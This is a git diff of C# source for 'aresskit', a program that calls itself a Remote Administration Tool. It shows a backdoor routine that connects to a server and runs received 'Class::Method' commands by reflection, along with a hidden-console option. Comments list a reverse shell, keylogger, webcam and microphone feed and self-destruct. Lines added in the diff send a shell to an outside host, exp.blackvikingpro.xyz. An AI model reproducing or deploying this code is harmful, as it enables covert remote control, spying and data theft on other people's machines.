@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Threading;
@@ -7,10 +7,6 @@ namespace aresskit
 {
     class Program
     {
-        const string server = "localhost";
-        const int port = 9000;
-        const bool hideConsole = true;
-
         private static void sendBackdoor(string server, int port)
         {
             try
@@ -41,36 +37,47 @@ namespace aresskit
                         {
                             if (!responseData.Contains("::"))
                             {
-                                if (responseData == "\n") { } else
-                                {
+                                if (responseData != "\n")
                                     output = Toolkit.byteCode("'" + responseData.Replace("\n", "") + "' is not a recognized command.\n");
-                                }
                             } else
                             {
                                 responseData = responseData.Trim(); // To eliminate annoying things in the string
-                                string[] class_method = responseData.Split(new[] { "::" }, StringSplitOptions.None);
-
-                                for (int i=1; i< class_method.Length; i++)
-                                {
-                                    Console.WriteLine("arg: " + class_method[i]);
-                                }
                                 
-                                Type type = Type.GetType("aresskit." + class_method[0]);
-                                object instance = Activator.CreateInstance(type);
+                                // Will produce: (clas name), (method name), [arg](,)[arg]...
+                                string[] classMethod = responseData.Split(new[] { "::" }, StringSplitOptions.None);
 
-                                if (type != null)
+
+                                Type methodType = Type.GetType("aresskit." + classMethod[0]); // Get type: aresskit.Class
+                                object classInstance = Activator.CreateInstance(methodType); // Create instance of 'aresskit.Class'
+
+                                string[] methodData = classMethod[1].Split(new char[0]);
+                                MethodInfo methodInstance = methodType.GetMethod(methodData[0]);
+                                if (methodInstance == null)
+                                    output = Toolkit.byteCode("No such class/method with the name '" + classMethod[0] + "::" + classMethod[1] + "'");
+                                ParameterInfo[] methodParameters = methodInstance.GetParameters();
+
+
+                                string parameterString = default(string);
+                                string[] parameterArray = { "" };
+
+                                if (methodInstance != null)
                                 {
-                                    var methodData = class_method[1].Split(new char[0]);
-                                    MethodInfo method = type.GetMethod(methodData[0]);
-
-                                    if (method != null)
+                                    if (methodParameters.Length == 0)
                                     {
-                                        for(int i=1; i< methodData.Length; i++)
+                                        output = Toolkit.byteCode(methodInstance.Invoke(classInstance, null) + "\n");
+                                    }
+                                    else
+                                    {
+                                        if (methodParameters[0].ParameterType.ToString() == "System.String")
                                         {
-                                            string str = methodData[i];
-                                            System.Console.WriteLine("Arg: " + str); // should output something like "Socket::ListenPort TCP 9000"
+                                            for (int i = 1; i < methodData.Length; i++)
+                                            {
+                                                parameterString += methodData[i] + " ";
+                                            }
+                                            parameterArray[0] = parameterString;
                                         }
-                                        output = Toolkit.byteCode(method.Invoke(instance, methodData).ToString() + "\n");
+                                        output = Toolkit.byteCode(methodInstance.Invoke(classInstance, parameterArray).ToString() + "\n");
+                                        // Console.WriteLine(methodInstance.Invoke(classInstance, parameterArray).ToString() + "\n");
                                     }
                                 }
                             }
@@ -78,7 +85,6 @@ namespace aresskit
                         {
                             output = Toolkit.byteCode(e.ToString());
                         }
-                        // try { output = Toolkit.byteCode(Toolkit.exec(responseData)); } catch (Exception) { output = Toolkit.byteCode("Command couldn't execute."); }
                     }
 
                     try
@@ -102,11 +108,13 @@ namespace aresskit
 
         static void Main(string[] args)
         {
+            string server = "localhost";
+            int port = 9000;
+
             var handle = GetConsoleWindow();
 
             // Hide Window
-            if (hideConsole)
-                ShowWindow(handle, SW_HIDE);
+            // ShowWindow(handle, SW_HIDE);
             
             // Fully featured Remote Administration Tool (RAT)
             /*
@@ -115,7 +123,7 @@ namespace aresskit
              * - Reverse Command Prompt Shell (minimalistic, no auth required)
              * - UDP/TCP Port Listener (similar to Netcat)
              * - File downloader/uploader
-             * - Live Cam/Mic Feed
+             * - Live Cam/Mic Feed (extra-fee)
              * - Screenshot(s)
              * - Real-Time and Log-based Keylogger
              * - Self-destruct feature (protect your privacy)
@@ -136,7 +144,7 @@ namespace aresskit
 
             aresskit.Toolkit toolkit = new aresskit.Toolkit();
             // toolkit.selfDestruct();
-            // toolkit.sendShell("localhost", 9000);
+            // toolkit.sendShell("exp.blackvikingpro.xyz", 9000);
             // toolkit.portListener(9000, "tcp");
             // toolkit.listenShell(9000);
             // Console.WriteLine("Connected to the internet? " + toolkit.checkInternetConn("www.google.com"));
@@ -149,10 +157,10 @@ namespace aresskit
                 Thread.CurrentThread.IsBackground = true;
                 Console.WriteLine("Thread is running...");
                 // run your code here
-                toolkit.sendShell("localhost", 9000);
+                toolkit.sendShell("exp.blackvikingpro.xyz", 9000);
             }).Start();
             */
-            // toolkit.sendShell("localhost", 9000);
+            // toolkit.sendShell("exp.blackvikingpro.xyz", 9000);
 
             aresskit.Administration system = new aresskit.Administration();
             // Console.WriteLine("Running in Virtual Machine? " + system.DetectVirtualMachine());
@@ -185,8 +193,6 @@ namespace aresskit
                 }
                 System.Threading.Thread.Sleep(5000); // sleep for 5 seconds before retrying
             }
-
-            // Console.ReadKey();
         }
 
         [DllImport("kernel32.dll")]
